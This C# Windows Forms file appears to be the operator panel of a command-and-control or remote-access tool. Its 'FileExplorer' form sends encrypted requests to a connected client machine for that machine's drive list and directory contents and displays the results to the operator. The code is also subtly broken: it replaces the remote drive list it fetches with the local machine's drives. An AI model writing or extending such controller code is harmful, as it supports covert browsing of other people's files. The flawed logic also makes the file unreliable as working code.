using CNC.Core.Data;
using CNC.Core.Security;
using Newtonsoft.Json;
using Shared.Objects;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CNC.Forms
{
    public partial class FileExplorer : Form
    {
        public DriveInfo[] drives;
        Client currentClient;
        string currentPath;
        public FileExplorer(Client client)
        {
            currentClient = client;
            InitializeComponent();
            GetDrives();
        }

        public void GetDrives()
        {
            
            drives = JsonConvert.DeserializeObject<DriveInfo[]>(Cryptography.Decrypt(
                currentClient.Connection.SendReceiveObject<string, string>("GetDriveInfoReq", "GetDriveInfoRep", 10000,
                Cryptography.Encrypt(Guid.NewGuid().ToString()))));
                
            drives = DriveInfo.GetDrives();

            driveBox.Items.Clear();
            for (int i = 0; i < drives.Length; i++)
            {
                driveBox.Items.Add(new DrivesComboBoxEntry(drives[i].Name, drives[i]));
            }
        }

        public void GetDirectoryInfo()
        {
            listViewCurrent.Items.Clear();
            
            FileEntry[] fe = JsonConvert.DeserializeObject<FileEntry[]>(
                Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("GetDirectoryContentReq", 
                "GetDirectoryContentRep", 20000, 
                Cryptography.Encrypt(currentPath))));
                

            for (int i = 0; i < fe.Length; i++)
            {
                listViewCurrent.Items.Add(new ListViewItem(new string[] { fe[i].Name, fe[i].Size.ToString(), fe[i].Type.ToString() }));
            }
        }

        private void driveBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            DrivesComboBoxEntry newDrive = (DrivesComboBoxEntry)driveBox.SelectedItem;
            txtPath.Text = newDrive.Drive.RootDirectory.FullName;
            currentPath = newDrive.Drive.RootDirectory.FullName;
        }
    }
}
